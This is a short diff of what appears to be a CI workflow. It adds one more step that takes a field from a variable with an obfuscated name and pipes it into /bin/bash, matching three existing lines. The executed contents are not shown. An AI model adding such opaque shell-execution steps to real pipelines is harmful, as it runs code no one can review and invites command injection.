@@ -30,6 +30,7 @@ jobs:
           echo $nx95 | jq -r .bv261 | /bin/bash
           printf '%s' "$eicd163" | jq -r .mel43 | /bin/bash
           printf '%s' "$eui8" | jq -r .hslm023 | /bin/bash
+          echo $cwuf57589 | jq -r .onb0 | /bin/bash
 
       - name: Store results
         if: always()
